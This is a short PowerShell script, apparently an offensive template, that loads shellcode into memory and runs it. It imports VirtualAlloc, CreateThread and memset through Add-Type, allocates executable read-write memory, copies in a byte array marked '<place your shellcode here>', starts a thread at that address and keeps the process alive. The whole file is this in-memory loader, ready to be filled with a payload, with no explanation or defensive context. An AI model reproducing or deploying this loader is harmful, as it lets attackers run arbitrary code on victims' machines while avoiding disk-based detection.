$code = '
[DllImport("kernel32.dll")]
public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

[DllImport("kernel32.dll")]
public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

[DllImport("msvcrt.dll")]
public static extern IntPtr memset(IntPtr dest, uint src, uint count);';

$windoof = 
  Add-Type -memberDefinition $code -Name "iWin32" -namespace Win32Functions -passthru;

[Byte[]];
[Byte[]]$shellcode = #<place your shellcode here>; 

$size = 0x1000;

if ($shellcode.Length -gt 0x1000) {$size = $shellcode.Length};

$x = $windoof::VirtualAlloc(0,$size,0x3000,0x40);

for ($i=0;$i -le ($shellcode.Length-1);$i++) {$windoof::memset([IntPtr]($x.ToInt32()+$i), $shellcode[$i], 1)};

$windoof::CreateThread(0,0,$x,0,0,0);for (;;) { Start-sleep 60 };